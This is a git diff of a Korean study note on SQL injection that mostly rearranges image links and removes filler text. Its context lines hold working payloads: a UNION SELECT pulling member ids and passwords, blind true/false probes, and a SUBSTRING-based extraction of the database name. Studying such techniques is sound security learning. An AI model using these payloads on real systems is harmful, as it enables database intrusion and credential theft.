@@ -113,8 +113,6 @@ UNION SELECT 1,2,3,m_id,m_pwd,m_name,NULL,NULL FROM member--
 
 쿼리 결과가 **참/거짓**인지에 따라 정보를 획득하는 공격 기법.
 
-
-![](../Images/Pasted%20image%2020260730093626.png)
 ```sql
 attacker' and 1=1--   -- 참 구문
 attacker' and 1=2--   -- 거짓 구문
@@ -131,17 +129,23 @@ attacker' and ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0))) AS VARCHAR(20)),6,
 
 
 첫 글자 l.. -> 노가다로 'lecture' db name get!!
-
 ```
-**다른 구문
+
+![](../Images/Pasted%20image%2020260730093626.png)
+
+
+```sql
+다른 구문
+
 %' and 'a%'='a
 %' and '1%'='1
+```
+![](../Images/Pasted%20image%2020260730094602.png)
 
 
-ddsfsasd
-dfasdfa
-dfasdf
-asdfadsf
+
+
+
 
 
 
